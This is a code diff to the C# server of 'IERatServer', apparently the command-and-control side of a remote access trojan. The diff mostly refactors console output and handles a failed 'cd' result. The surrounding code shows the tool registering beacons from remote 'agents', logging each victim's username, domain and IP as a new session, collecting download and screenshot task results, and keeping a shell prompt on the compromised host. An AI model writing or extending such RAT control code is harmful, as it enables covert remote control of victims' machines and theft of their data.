@@ -3,6 +3,7 @@ using System.Threading.Tasks;
 using WatsonWebserver;
 using IERatServer.lib;
 using Newtonsoft.Json;
+using System.Drawing;
 
 namespace IERatServer
 {
@@ -33,16 +34,16 @@ namespace IERatServer
                 // print command results and save to history
                 foreach (TaskObject taskObject in requestObject.CompletedTasks)
                 {
-                    if ((taskObject.Type == "download") || (taskObject.Type == "upload") || (taskObject.Type == "screenshot"))
+                    if ((taskObject.Type == "download") || (taskObject.Type == "screenshot"))
                     {
                         Actions.HandleAdvancedTasks(requestObject, taskObject);
                     }
                     else
                     {
-                        Console.ForegroundColor = ConsoleColor.Green;
-                        Console.WriteLine($"\nCommand Output received [{taskObject.Type} command]: {taskObject.Result}\n");
+                        if (taskObject.Type != "cd")  {
+                            CLI.ScreenMessage($"Command Output received [{taskObject.Type} command]: {taskObject.Result}");
+                        }
                         Logger.Log("info", $"Command Output received from agent {requestObject.AgentID}: [{taskObject.Type} command]: {taskObject.Result}");
-                        Console.ForegroundColor = ConsoleColor.White;
 
                         AgentChannel ActiveChannel = Db.channels.Find(ActiveChannel => ActiveChannel.InteractNum == CLI.InteractContext);
                         var agent = ActiveChannel.agent;
@@ -56,8 +57,20 @@ namespace IERatServer
                         {
                             if (ActiveChannel != null)
                             {
-                                agent.Cwd = taskObject.Result.Split(new string[] { " " }, StringSplitOptions.None)[3];
-                                CLI.loop._client.Prompt = $"({agent.Username}@{agent.Hostname})-[{agent.Cwd}]$ ";
+                                if (taskObject.Result == "Error - the directory does not exist")
+                                {
+                                    CLI.ScreenMessage($"Command Output received [{taskObject.Type} command]: {taskObject.Result}");
+                                    Logger.Log("info", $"Command Output received from agent {requestObject.AgentID}: [{taskObject.Type} command]: {taskObject.Result}");
+                                }
+                                else
+                                {
+                                    agent.Cwd = taskObject.Result.Split(new string[] { " " }, StringSplitOptions.None)[3];
+                                    Colorful.Console.ForegroundColor = Color.Blue;
+                                    Colorful.Console.WriteLine($"\nCommand Output received [{taskObject.Type} command]: {taskObject.Result}\n");
+                                    Colorful.Console.ForegroundColor = Color.White;
+                                    CLI.loop._client.Prompt = $"({agent.Username}@{agent.Hostname})-[{agent.Cwd}]$ ";
+                                    CLI.loop._client.DisplayPrompt();
+                                }
                             }
                         }
                     }                  
@@ -99,10 +112,8 @@ namespace IERatServer
                 {
                     responseObject.Notes = "Authenticated";
                     var newSessionNumber = Db.NewAgentChannel(beacon, ctx.Request.Source.IpAddress);
-                    Console.ForegroundColor = ConsoleColor.Blue;
-                    Console.WriteLine($"\nNew session opened [#{newSessionNumber}] from {beacon.Username}@{beacon.Domain} [{ctx.Request.Source.IpAddress}]\n");
+                    CLI.ScreenMessage($"New session opened [#{newSessionNumber}] from {beacon.Username}@{beacon.Domain} [{ctx.Request.Source.IpAddress}]");
                     Logger.Log("info", $"New session opened [#{newSessionNumber}] from {beacon.Username}@{beacon.Domain} [{ctx.Request.Source.IpAddress}] [ID = {beacon.ID}]");
-                    Console.ForegroundColor = ConsoleColor.White;
                 }
                 var responseString = JsonConvert.SerializeObject(responseObject);
                 await ctx.Response.Send(ServerUtils.GenerateResponse(responseString));
